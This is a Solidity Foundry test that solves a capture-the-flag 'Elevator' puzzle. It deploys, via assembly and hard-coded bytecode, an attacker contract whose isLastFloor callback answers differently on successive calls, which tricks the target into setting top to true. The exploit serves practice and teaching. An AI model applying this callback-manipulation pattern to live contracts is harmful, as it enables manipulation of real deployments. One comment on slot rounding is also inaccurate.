pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Elevator.sol";

contract Boom is Building {
    function isLastFloor(uint256) external returns (bool result) {
        assembly {
            // save the fact that function has been called before
            result := sload(0)
            if eq(result, 0x0) { sstore(0, 1) }
        }
    }

    function attack(address _target) external {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, shl(0xe0, 0xed9a7134)) // goTo(uint256)
            // call with uint256 == 0
            let success := call(gas(), _target, 0, ptr, 0x24, 0, 0)
            if eq(success, 0) { revert(0, 0) }
        }
    }
}

contract ASMElevator is Test {
    Elevator public target;
    bytes bytecode =
        hex"608060405234801561001057600080fd5b5061011f806100206000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80635f9a4bca146037578063d018db3e14605a575b600080fd5b6046604236600460a3565b606b565b604051901515815260200160405180910390f35b6069606536600460bb565b607d565b005b6000548060785760016000555b919050565b604051633b669c4d60e21b815260008060248382865af1905080609f57600080fd5b5050565b60006020828403121560b457600080fd5b5035919050565b60006020828403121560cc57600080fd5b81356001600160a01b038116811460e257600080fd5b939250505056fea26469706673582212205e85b1298168fa80c31cdb35bd1076ade62e4dcb377853d4aab0ecdd66b57cf264736f6c63430008110033";

    function setUp() public {
        target = new Elevator();
    }

    function testAttackElevator() public {
        assembly {
            // init fmp
            let ptr := mload(0x40)

            // we know there are more than 32 bytes so the data in the slot is the length
            // we need to divide by 2 to account 2 hex characters per byte
            let bytecode_length := div(sload(bytecode.slot), 2)

            // we can get the start of the storage location of the data by hashing the slot
            mstore(ptr, bytecode.slot)
            let bytecode_start := keccak256(ptr, 0x20)
            // update the pointer after the hashed value
            ptr := add(ptr, 0x20)

            // whole slots used by our dynamic bytearray are the array length / 32
            let slots := div(bytecode_length, 0x20)

            // we also add 1 for a partial slot if needed
            // this would be the case if slots (from integer division) * 32 bytes == bytecode_length
            // indicating no remainders
            if not(eq(mul(0x20, slots), bytecode_length)) { slots := add(slots, 1) }

            // begin the loop, saving the start location of the data in memory
            let startPtr := ptr
            for { let i := 0 } lt(i, slots) { i := add(i, 1) } {
                // grab the data from the adjacent slot
                let data := sload(add(bytecode_start, i))
                // save the data
                mstore(ptr, data)
                // each time we load into memory, increment the pointer by 0x20 bytes
                ptr := add(ptr, 0x20)
            }

            // we have now loaded the full init + runtime code to memory
            // we can pass the memory start offset and length to the create opcode
            // which will create a new sub context and return us the address where the init bytecode is deployed
            let boom := create(0, startPtr, bytecode_length)

            mstore(ptr, shl(0xe0, 0xd018db3e)) // attack(address)
            mstore(add(ptr, 0x4), sload(target.slot))

            let success := call(gas(), boom, 0, ptr, 0x24, 0, 0)

            if eq(success, 0) { revert(0, 0) }
        }
        assertEq(target.top(), true);
    }
}
